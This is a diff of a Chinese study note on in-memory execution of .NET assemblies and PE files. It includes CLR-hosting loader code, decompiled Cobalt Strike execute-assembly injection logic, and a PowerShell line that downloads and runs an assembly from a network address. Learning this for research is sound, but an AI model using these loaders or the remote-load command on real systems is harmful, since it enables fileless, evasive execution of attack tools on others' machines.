@@ -1,6 +1,122 @@
-# 通过.NET实现内存加载PE文件
+# 内存加载执行文件的方法
 
-## 1. 从内存加载.NET程序集(Assembly.Load)
+分两部分：
+
+* .NET程序集
+* PE文件
+
+## 0. 执行本地文件
+
+此处以C#和C++为例：AI都会写
+
+### exe
+
+在C#中执行一个`.exe`文件可以使用`Process`类，
+
+```c#
+using System;
+using System.Diagnostics;
+
+class Program
+{
+    static void Main()
+    {
+        Process.Start("C:\\file.exe");
+    }
+}
+```
+
+而在C++中可以使用`CreateProcess`函数。
+
+```c++
+#include <windows.h>
+
+int main()
+{
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    ZeroMemory(&pi, sizeof(pi));
+
+    // Start the child process.
+    if (!CreateProcess(NULL, "C:\\file.exe", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
+    {
+        printf("CreateProcess failed (%d).\n", GetLastError());
+        return 1;
+    }
+
+    // Wait until child process exits.
+    WaitForSingleObject(pi.hProcess, INFINITE);
+
+    // Close process and thread handles.
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+
+    return 0;
+}
+```
+
+
+
+### dll
+
+在C#中执行一个`.dll`文件通常涉及在应用程序中加载并调用该`.dll`中的函数。
+
+```c#
+using System;
+using System.Runtime.InteropServices;
+
+class Program
+{
+    [DllImport("C:\\dll_file.dll")]
+    public static extern void YourFunction(); // 假设要调用的函数没有返回值
+
+    static void Main()
+    {
+        YourFunction(); // 调用从DLL中导入的函数
+    }
+}
+```
+
+在C++中执行一个`.dll`文件通常是通过加载动态链接库并调用其中的函数。
+
+```c++
+#include <windows.h>
+
+typedef void (*YourFunction)(); // 假设要调用的函数没有返回值
+
+int main()
+{
+    HINSTANCE hDLL = LoadLibrary("C:\\dll_file.dll");
+    if (hDLL != NULL)
+    {
+        YourFunction yourFunction = (YourFunction)GetProcAddress(hDLL, "YourFunction");
+        if (yourFunction != NULL)
+        {
+            yourFunction(); // 调用从DLL中导入的函数
+        }
+        else
+        {
+            // 处理函数加载失败的情况
+        }
+        FreeLibrary(hDLL);
+    }
+    else
+    {
+        // 处理DLL加载失败的情况
+    }
+
+    return 0;
+}
+```
+
+
+
+## 1. managed代码内存加载.NET程序集
+
+**(Assembly.Load)**
 
 使用C#从内存中加载.NET程序集，直接用`Assembly.Load`就行了。
 
@@ -16,9 +132,9 @@
 
 * `Assembly.LoadFile()`也是从指定文件中加载程序集，但不会加载目标程序集所引用和依赖的其他程序集，例如：`Assembly.LoadFile("a.dll")`，如果a.dll中引用了b.dll，那么不会加载b.dll
 
-### 1.2. Assembly.Load()的实现示例
+### 1.2. C#反射加载流程
 
-#### (1) 编写测试程序
+**(1) 编写测试程序**
 
 测试程序的代码如下：
 
@@ -53,7 +169,7 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:testcalc.exe test.c
 
 生成testcalc.exe
 
-#### (2) 测试的.exe作base64编码
+**(2) 测试的.exe作base64编码**
 
 代码如下：
 
@@ -75,7 +191,7 @@ namespace TestApplication
 }
 ```
 
-#### (3) 还原.exe的内容
+**(3) 还原.exe的内容**
 
 ```C#
 using System;
@@ -94,7 +210,7 @@ namespace TestApplication
 
 
 
-#### (4) 使用Assembly.Load()加载程序集并调用方法
+**(4) 使用Assembly.Load()加载程序集并调用方法**
 
 代码如下：
 
@@ -146,13 +262,67 @@ namespace TestApplication
 }
 ```
 
+### 1.3. 示例代码
+
+#### c#
+
+```C#
+using System;
+using System.IO;
+using System.Reflection;
+
+namespace MemoryLoadApplication
+{
+
+    class Program
+    {
+
+        static void Main(string[] args)
+        {
+
+            byte[] buffer = File.ReadAllBytes(@"C:\Users\Black Sheep\source\repos\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe");
+            string base64str = Convert.ToBase64String(buffer);
+            string dir = Directory.GetCurrentDirectory();
+            buffer = Convert.FromBase64String(base64str);
+            File.WriteAllText($"{dir}\\base64.txt", base64str);
+            Assembly assembly = System.Reflection.Assembly.Load(buffer);
+            assembly.EntryPoint.Invoke(null, new object[] { args });
+
+        }
+    }
+}
+```
+
+#### powershell
+
+```powershell
+$base64 = "TVqQAAMAAAAEAAA(前面生成的base64编码的程序集)";
+$bins  = [System.Convert]::FromBase64String($base64);
+$invoke = [System.Reflection.Assembly]::Load($bins);
+[System.Console]::WriteLine($invoke);
+
+$args = New-Object -TypeName System.Collections.ArrayList
+
+[string[]]$strings = "-group=all","-full"
+
+$args.Add($strings)
+
+$invoke.EntryPoint.Invoke($N,$args.ToArray());
+```
+
+也可以远程加载
+
+```powershell
+$invoke = [System.Reflection.Assembly]::UnsafeLoadFrom("http://192.168.0.125/base");
+```
 
 
-## 2. 从内存加载.NET程序集(execute-assembly)
+
+## 2. unmanaged代码内存加载.NET程序集
+
+**(execute-assembly)**
 
 当不是用C#编写代码，但还是想要实现上面的操作时，例如Cobalt Strike 3.11中，加入了一个名为”execute-assembly”的命令，能够从内存中加载.NET程序集。`execute-assembly`功能的实现，必须使用一些来自.NET Framework的核心接口来执行.NET程序集口
-
-
 
 ### 2.1. 基础知识
 
@@ -183,226 +353,321 @@ CLR是.NET Framework的主要执行引擎，作用之一是监视程序的运行
 - **ICLRRuntimeInfo**: 一旦你有了表示特定CLR版本的`ICLRRuntimeInfo`接口，你可以用它来获取CLR运行时的其他接口，例如`ICLRRuntimeHost`。这个接口还允许你判断这个特定版本的CLR是否已经被加载到进程中。
 - **ICLRRuntimeHost**: 这是执行.NET程序集所必需的主要接口。通过这个接口，你可以启动托管代码的执行环境，加载.NET程序集，并执行它。具体来说，它的`ExecuteInDefaultAppDomain`方法可以用来加载和执行.NET程序集。
 
-综上所述，要在非托管代码（如C++）中执行.NET程序集，你需要首先使用`ICLRMetaHost`来确定哪个CLR版本已加载或可用。然后，你可以使用`ICLRRuntimeInfo`来为这个CLR版本获取`ICLRRuntimeHost`。最后，使用`ICLRRuntimeHost`来加载和执行.NET程序集。
+综上所述，要在非托管代码（如C++）中执行.NET程序集，你需要首先使用`ICLRMetaHost`来确定哪个CLR版本已加载或可用。然后使用`ICLRRuntimeInfo`来为这个CLR版本获取`ICLRRuntimeHost`。最后用`ICLRRuntimeHost`来加载和执行.NET程序集。
 
-### 2.2. 基础实现方法（非内存加载）
+### 2.2. CS内存执行流程分析
 
-#### 步骤
+在Cobalt Strike的代码中找到BeaconConsole.java文件，定位到“execute-assembly”命令处。通过简单分析这段代码可以知道，当解析到用户执行“execute-assembly”命令后，会先验证”pZ“和”F“关键字来判断要执行的.net程序集是否带有参数（具体如何判断请查看CommandParser类）。判断完成使用CommandParser类的popstring方法将execute-assembly的参数赋值给变量，然后调用ExecuteAssembly方法执行程序集。
 
-**(1) 将CLR加载到进程中**
+[![image-20220114182430780](img/PELoader/image-20220114182430780-16443915545351.png)](https://0pen1.github.io/2022/02/09/net程序集内存加载执行技术/net程序集内存加载执行技术.assets/image-20220114182430780-16443915545351.png)
 
-1) 调用`CLRCreateInstance`函数以获取`ICLRMetaHost`或`ICLRMetaHostPolicy`接口
+我们继续跟进ExecuteAssembly方法，ExecuteAssembly方法有两个参数，第一个参数为待执行的.net程序集路径，第二个参数为.net程序集执行需要的参数。执行这个方法时先将要执行的.net程序集从硬盘读取并加载到PE解析器（PEParser）中，随后判断加载的PE文件是否为.net程序集，如果是.net程序集则创建ExecuteAssemblyJob实例并调用spawn方法。
 
-2) 获取有效的`ICLRRuntimeInfo`指针（三种方式任选）：
+[![image-20220114182256752](img/PELoader/image-20220114182256752.png)](https://0pen1.github.io/2022/02/09/net程序集内存加载执行技术/net程序集内存加载执行技术.assets/image-20220114182256752.png)
 
-* 调用`ICLRMetaHost::EnumerateInstalledRuntimes`
-* 调用`ICLRMetaHost::GetRuntime`
-* 调用`ICLRMetaHostPolicy::GetRequestedRuntime`方法
+接下来进入spawn方法，可以看到是**通过反射DLL的方法，将invokeassembly.dll注入到进程当中**（这块也不知道咋实现的），并且设置任务号为70（x86版本）或者71（x64）。注入的invokeassembly.dll在其内存中创建CLR环境，然后通过管道再将C#可执行文件读取到内存中,最后执行。
 
-3) 使用`ICorRuntimeHost`或者`ICLRRuntimeHost`，二者都是调用`ICLRRuntimeInfo::GetInterface`方法，但是参数不同
+```java
+public void spawn(String var1) {
+      byte[] var2 = this.getDLLContent();
+      int var3 = ReflectiveDLL.findReflectiveLoader(var2);
+      if (var3 <= 0) {
+         this.tasker.error("Could not find reflective loader in " + this.getDLLName());
+      } else {
+         if (ReflectiveDLL.is64(var2)) {
+            if (this.ignoreToken()) {
+               this.builder.setCommand(71);
+            } else {
+               this.builder.setCommand(88);
+            }
+         } else if (this.ignoreToken()) {
+            this.builder.setCommand(70);
+         } else {
+            this.builder.setCommand(87);
+         }
 
-`ICorRuntimeHost`
+         var2 = this.fix(var2);
+         if (this.tasker.obfuscatePostEx()) {
+            var2 = this._obfuscate(var2);
+         }
 
+         var2 = this.setupSmartInject(var2);
+         byte[] var4 = this.getArgument();
+         this.builder.addShort(this.getCallbackType());
+         this.builder.addShort(this.getWaitTime());
+         this.builder.addInteger(var3);
+         this.builder.addLengthAndString(this.getShortDescription());
+         this.builder.addInteger(var4.length);
+         this.builder.addString(var4);
+         this.builder.addString(var2);
+         byte[] var5 = this.builder.build();
+         this.tasker.task(var1, var5, this.getDescription(), this.getTactic());
+      }
+   }
 ```
-支持v1.0.3705, v1.1.4322, v2.0.50727和v4.0.30319
-指定CLSID_CorRuntimeHost为rclsid参数
-指定IID_ICorRuntimeHost为RIID参数
-```
 
-`ICLRRuntimeHost`
+[![image-20220209135538841](img/PELoader/image-20220209135538841.png)](https://0pen1.github.io/2022/02/09/net程序集内存加载执行技术/net程序集内存加载执行技术.assets/image-20220209135538841.png)
 
-```
-支持v2.0.50727和v4.0.30319
-指定CLSID_CLRRuntimeHost为rclsid参数
-指定IID_ICLRRuntimeHost为RIID参数
-```
+[![image-20220117192352767](img/PELoader/image-20220117192352767.png)](https://0pen1.github.io/2022/02/09/net程序集内存加载执行技术/net程序集内存加载执行技术.assets/image-20220117192352767.png)
 
+总结一下，Cobalt Strike内存加载执行.net程序集大概的过程就是，首先spawn一个进程并传输invokeassembly.dll注入到该进程，invokeassembly.dll实现了在其内存中创建CLR环境，然后通过管道再将C#可执行文件读取到内存中,最后执行。
 
+**那么invokeassembly.dll内部是如何操作的呢？**
 
-**(2) 加载.NET程序集并调用静态方法**
+### 2.3. 硬盘加载执行.NET程序集
 
-在代码实现上，使用`ICLRRuntimeHost`会比使用`ICorRuntimeHost`简单的多
+1. 初始化ICLRMetaHost接口。
+2. 通过ICLRMetaHost获取ICLRRuntimeInfo接口。
+3. 通过ICLRRuntimeInfo将 CLR 加载到当前进程并返回运行时接口ICLRRuntimeHost指针。
+4. 通过ICLRRuntimeHost.Start()初始化CLR。
+5. 通过ICLRRuntimeHost.EecuteInDefaultAppDomain执行指定程序集(硬盘上)。
 
-**(3) 清理CLR**
+#### 示例代码
 
-释放步骤1中的指针
-
-#### 代码示例
-
-下面使用`ICLRMetaHost::GetRuntime`获取有效的`ICLRRuntimeInfo`指针，使用`ICLRRuntimeHost`从文件加载.NET程序集并调用静态方法
+**unmanaged.cpp**
 
 ```C++
-#include "stdafx.h"
 #include <metahost.h>
-#include <windows.h>
-#pragma comment(lib, "MSCorEE.lib")
-
-HRESULT RuntimeHost_GetRuntime_ICLRRuntimeInfo(PCWSTR pszVersion, PCWSTR pszAssemblyName, PCWSTR pszClassName, PCWSTR pszMethodName, PCWSTR pszArgName)
-{
-	// Call the ICLRMetaHost::GetRuntime to get a valid ICLRRuntimeInfo.
-	// Call the ICLRRuntimeInfo:GetInterface method.
-	HRESULT hr;
-	ICLRMetaHost *pMetaHost = NULL;
-	ICLRRuntimeInfo *pRuntimeInfo = NULL;
-	ICLRRuntimeHost *pClrRuntimeHost = NULL;
-	DWORD dwLengthRet;
-	// 
-	// Load and start the .NET runtime.
-	// 
-	wprintf(L"Load and start the .NET runtime %s \n", pszVersion);
-	hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_PPV_ARGS(&pMetaHost));
-	if (FAILED(hr))
-	{
-		wprintf(L"[!]CLRCreateInstance failed w/hr 0x%08lx\n", hr);
-		goto Cleanup;
-	}
-	// Get the ICLRRuntimeInfo corresponding to a particular CLR version. It 
-	// supersedes CorBindToRuntimeEx with STARTUP_LOADER_SAFEMODE.
-	hr = pMetaHost->GetRuntime(pszVersion, IID_PPV_ARGS(&pRuntimeInfo));
-	if (FAILED(hr))
-	{
-		wprintf(L"[!]ICLRMetaHost::GetRuntime failed w/hr 0x%08lx\n", hr);
-		goto Cleanup;
-	}
-	// Check if the specified runtime can be loaded into the process. This 
-	// method will take into account other runtimes that may already be 
-	// loaded into the process and set pbLoadable to TRUE if this runtime can 
-	// be loaded in an in-process side-by-side fashion. 
-	BOOL fLoadable;
-	hr = pRuntimeInfo->IsLoadable(&fLoadable);
-	if (FAILED(hr))
-	{
-		wprintf(L"[!]ICLRRuntimeInfo::IsLoadable failed w/hr 0x%08lx\n", hr);
-		goto Cleanup;
-	}
-	if (!fLoadable)
-	{
-		wprintf(L"[!].NET runtime %s cannot be loaded\n", pszVersion);
-		goto Cleanup;
-	}
-	// Load the CLR into the current process and return a runtime interface 
-	// pointer. ICorRuntimeHost and ICLRRuntimeHost are the two CLR hosting  
-	// interfaces supported by CLR 4.0. Here we demo the ICLRRuntimeHost 
-	// interface that was provided in .NET v2.0 to support CLR 2.0 new 
-	// features. ICLRRuntimeHost does not support loading the .NET v1.x 
-	// runtimes.
-	hr = pRuntimeInfo->GetInterface(CLSID_CLRRuntimeHost, IID_PPV_ARGS(&pClrRuntimeHost));
-	if (FAILED(hr))
-	{
-		wprintf(L"[!]ICLRRuntimeInfo::GetInterface failed w/hr 0x%08lx\n", hr);
-		goto Cleanup;
-	}
-	// Start the CLR.
-	hr = pClrRuntimeHost->Start();
-	if (FAILED(hr))
-	{
-		wprintf(L"[!]CLR failed to start w/hr 0x%08lx\n", hr);
-		goto Cleanup;
-	}
-	// 
-	// Load the NET assembly and call the static method.
-	// 
-	wprintf(L"[+]Load the assembly %s\n", pszAssemblyName);
-	// The invoked method of ExecuteInDefaultAppDomain must have the 
-	// following signature: static int pwzMethodName (String pwzArgument)
-	// where pwzMethodName represents the name of the invoked method, and 
-	// pwzArgument represents the string value passed as a parameter to that 
-	// method. If the HRESULT return value of ExecuteInDefaultAppDomain is 
-	// set to S_OK, pReturnValue is set to the integer value returned by the 
-	// invoked method. Otherwise, pReturnValue is not set.
-	hr = pClrRuntimeHost->ExecuteInDefaultAppDomain(pszAssemblyName, pszClassName, pszMethodName, pszArgName, &dwLengthRet);
-	if (FAILED(hr))
-	{
-		wprintf(L"[!]Failed to call %s w/hr 0x%08lx\n", pszMethodName, hr);
-		goto Cleanup;
-	}
-	// Print the call result of the static method.
-	wprintf(L"[+]Call %s.%s(\"%s\") => %d\n", pszClassName, pszMethodName, pszArgName, dwLengthRet);
-
-Cleanup:
-	if (pMetaHost)
-	{
-		pMetaHost->Release();
-		pMetaHost = NULL;
-	}
-	if (pRuntimeInfo)
-	{
-		pRuntimeInfo->Release();
-		pRuntimeInfo = NULL;
-	}
-	if (pClrRuntimeHost)
-	{
-		// Please note that after a call to Stop, the CLR cannot be 
-		// reinitialized into the same process. This step is usually not 
-		// necessary. You can leave the .NET runtime loaded in your process.
-		//wprintf(L"Stop the .NET runtime\n");
-		//pClrRuntimeHost->Stop();
-		pClrRuntimeHost->Release();
-		pClrRuntimeHost = NULL;
-	}
-	return hr;
-}
+#pragma comment(lib, "mscoree.lib")
 
 int main()
 {
-	RuntimeHost_GetRuntime_ICLRRuntimeInfo(L"v4.0.30319", L"ClassLibrary1.dll", L"ClassLibrary1.Class1", L"TestMethod", L"argstring");
-	return 0;
-}
+    ICLRMetaHost* iMetaHost = NULL;
+    ICLRRuntimeInfo* iRuntimeInfo = NULL;
+    ICLRRuntimeHost* iRuntimeHost = NULL;
+
+    //初始化环境
+    CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&iMetaHost);
+    iMetaHost->GetRuntime(L"v4.0.30319", IID_ICLRRuntimeInfo, (LPVOID*)&iRuntimeInfo);
+    iRuntimeInfo->GetInterface(CLSID_CLRRuntimeHost, IID_ICLRRuntimeHost, (LPVOID*)&iRuntimeHost);
+    iRuntimeHost->Start();
+
+    //执行
+    iRuntimeHost->ExecuteInDefaultAppDomain(L"C:\\TEST.exe", L"TEST.Program", L"print", L"test", NULL);
+
+    //释放
+    iRuntimeInfo->Release();
+    iMetaHost->Release();
+    iRuntimeHost->Release();
+
+    return 0;
+};
 ```
 
-代码将会加载同级目录下.Net4.0开发的ClassLibrary1.dll，类名为Class1，方法为TestMethod，传入的参数为argstring
-
-ClassLibrary1.dll的代码如下：
+执行的C#源码
 
 ```C#
 using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
 
-namespace ClassLibrary1
+namespace TEST
 {
-    public class Class1
+    class Program
     {
-        public static int TestMethod(string str)
+        static int Main(String[] args)
         {
-            System.Diagnostics.Process p = new System.Diagnostics.Process();
-            p.StartInfo.FileName = "c:\\windows\\system32\\calc.exe";
-            p.Start();
-            return 0;
+
+            return 1;
+        }
+        static int print(String strings)
+        {
+            Console.WriteLine(strings);
+            return 1;
         }
     }
 }
 ```
 
-### 2.3. execute-assembly实现方法
+### 2.4. 内存加载执行.NET程序集
 
-#### 1. 从内存中读取shellcode并加载.NET程序集
+1.初始化CLR环境(同上)
 
-- 调用`ICLRMetaHost::EnumerateInstalledRuntimes`, `ICLRMetaHost::GetRuntime`或者`ICLRMetaHostPolicy::GetRequestedRuntime`方法以获取有效的`ICLRRuntimeInfo`指针
-- 使用`ICorRuntimeHost`接口
-- 使用`Load_3(…)`从内存中读取并加载.NET程序集
-- 调用静态方法
+```c++
+	CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (VOID**)&iMetaHost);
+	iMetaHost->GetRuntime(L"v4.0.30319", IID_ICLRRuntimeInfo, (VOID**)&iRuntimeInfo);
+	iRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (VOID**)&iRuntimeHost);
+	iRuntimeHost->Start();
+```
 
-#### 2. 从硬盘读取并加载.NET程序集
+2.通过ICLRRuntimeHost获取AppDomain接口指针，然后通过AppDomain接口的QueryInterface方法来查询默认应用程序域的实例指针。
 
-- 调用`ICLRMetaHost::EnumerateInstalledRuntimes`,` ICLRMetaHost::GetRuntime`或者`ICLRMetaHostPolicy::GetRequestedRuntime`方法以获取有效的`ICLRRuntimeInfo`指针
-- 使用`ICorRuntimeHost`(使用`Load_2(…)`)或者I`CLRRuntimeHost`接口
-- 加载.NET程序集并调用静态方法
+```c++
+	iRuntimeHost->GetDefaultDomain(&pAppDomain);
+	pAppDomain->QueryInterface(__uuidof(_AppDomain), (VOID**)&pDefaultAppDomain);
+```
 
-第一种利用思路要优于第二种，完整的利用过程如下：
+3.通过默认应用程序域实例的Load_3方法加载安全.net程序集数组，并返回Assembly的实例对象指针，通过Assembly实例对象的get_EntryPoint方法获取描述入口点的MethodInfo实例对象。
 
-1. 创建一个正常的进程
-2. 通过Dll反射向进程注入dll
-3. dll实现从内存中读取shellcode并加载最终的.NET程序集
+```c++
+	saBound[0].cElements = ASSEMBLY_LENGTH;
+	saBound[0].lLbound = 0;
+	SAFEARRAY* pSafeArray = SafeArrayCreate(VT_UI1, 1, saBound);
 
-优点如下：
+	SafeArrayAccessData(pSafeArray, &pData);
+	memcpy(pData, dotnetRaw, ASSEMBLY_LENGTH);
+	SafeArrayUnaccessData(pSafeArray);
 
-- 整个过程在内存执行，不写入文件系统
-- Payload以dll形式存在，不会产生可疑的进程
-- 最终的Payload为C#程序，现有的Powershell利用脚本转换为C#代码很方便
+	pDefaultAppDomain->Load_3(pSafeArray, &pAssembly);
+	pAssembly->get_EntryPoint(&pMethodInfo);
+```
+
+4.创建参数安全数组
+
+```c++
+ZeroMemory(&vRet, sizeof(VARIANT));
+	ZeroMemory(&vObj, sizeof(VARIANT));
+	vObj.vt = VT_NULL;
+
+	vPsa.vt = (VT_ARRAY | VT_BSTR);
+	args = SafeArrayCreateVector(VT_VARIANT, 0, 1);
+
+	if (argc > 1)
+	{
+		vPsa.parray = SafeArrayCreateVector(VT_BSTR, 0, argc);
+		for (long i = 0; i < argc; i++)
+		{
+			SafeArrayPutElement(vPsa.parray, &i, SysAllocString(argv[i]));
+		}
+
+		long idx[1] = { 0 };
+		SafeArrayPutElement(args, idx, &vPsa);
+	}
+```
+
+5.通过描述入口点的MethodInfo实例对象的Invoke方法执行入口点。
+
+```c++
+HRESULT hr = pMethodInfo->Invoke_3(vObj, args, &vRet);
+```
+
+#### 示例代码
+
+```C++
+#include <stdio.h>
+#include <tchar.h>
+#include <metahost.h>
+#pragma comment(lib, "mscoree.lib")
+
+#import <mscorlib.tlb> raw_interfaces_only			\
+    	high_property_prefixes("_get","_put","_putref")		\
+    	rename("ReportEvent", "InteropServices_ReportEvent")	\
+	rename("or", "InteropServices_or")
+
+using namespace mscorlib;
+#define ASSEMBLY_LENGTH  8192
+
+
+unsigned char dotnetRaw[8192] =
+"\x4d\x5a\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00...";//.net程序集字节数组
 
 
 
-## 3. 通过.NET实现内存加载PE文件
+int _tmain(int argc, _TCHAR* argv[])
+{
+
+	ICLRMetaHost* iMetaHost = NULL;
+	ICLRRuntimeInfo* iRuntimeInfo = NULL;
+	ICorRuntimeHost* iRuntimeHost = NULL;
+	IUnknownPtr pAppDomain = NULL;
+	_AppDomainPtr pDefaultAppDomain = NULL;
+	_AssemblyPtr pAssembly = NULL;
+	_MethodInfoPtr pMethodInfo = NULL;
+	SAFEARRAYBOUND saBound[1];
+	void* pData = NULL;
+	VARIANT vRet;
+	VARIANT vObj;
+	VARIANT vPsa;
+	SAFEARRAY* args = NULL;
+
+	CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (VOID**)&iMetaHost);
+	iMetaHost->GetRuntime(L"v4.0.30319", IID_ICLRRuntimeInfo, (VOID**)&iRuntimeInfo);
+	iRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (VOID**)&iRuntimeHost);
+	iRuntimeHost->Start();
+
+
+	iRuntimeHost->GetDefaultDomain(&pAppDomain);
+	pAppDomain->QueryInterface(__uuidof(_AppDomain), (VOID**)&pDefaultAppDomain);
+
+	saBound[0].cElements = ASSEMBLY_LENGTH;
+	saBound[0].lLbound = 0;
+	SAFEARRAY* pSafeArray = SafeArrayCreate(VT_UI1, 1, saBound);
+
+	SafeArrayAccessData(pSafeArray, &pData);
+	memcpy(pData, dotnetRaw, ASSEMBLY_LENGTH);
+	SafeArrayUnaccessData(pSafeArray);
+
+	pDefaultAppDomain->Load_3(pSafeArray, &pAssembly);
+	pAssembly->get_EntryPoint(&pMethodInfo);
+
+	ZeroMemory(&vRet, sizeof(VARIANT));
+	ZeroMemory(&vObj, sizeof(VARIANT));
+	vObj.vt = VT_NULL;
+
+
+
+	vPsa.vt = (VT_ARRAY | VT_BSTR);
+	args = SafeArrayCreateVector(VT_VARIANT, 0, 1);
+
+	if (argc > 1)
+	{
+		vPsa.parray = SafeArrayCreateVector(VT_BSTR, 0, argc);
+		for (long i = 0; i < argc; i++)
+		{
+			SafeArrayPutElement(vPsa.parray, &i, SysAllocString(argv[i]));
+		}
+
+		long idx[1] = { 0 };
+		SafeArrayPutElement(args, idx, &vPsa);
+	}
+
+	HRESULT hr = pMethodInfo->Invoke_3(vObj, args, &vRet);
+	pMethodInfo->Release();
+	pAssembly->Release();
+	pDefaultAppDomain->Release();
+	iRuntimeInfo->Release();
+	iMetaHost->Release();
+	CoUninitialize();
+
+	return 0;
+};
+
+```
+
+执行的C#源码
+
+```C#
+using System;
+
+namespace TEST
+{
+    class Program
+    {
+        static int Main(String[] args)
+        {
+            Console.WriteLine("hello world!");
+            foreach (var s in args)
+            {
+                Console.WriteLine(s);
+            }
+            return 1;
+        }
+    }
+}
+```
+
+
+
+## 3. managed代码内存加载执行PE文件
+
+需要自己实现PE加载器
+
+
+
+## 4. unmanaged代码内存加载执行PE文件
+
+需要自己实现PE加载器
+
+
+
+
+
+TODO:反射dll注入
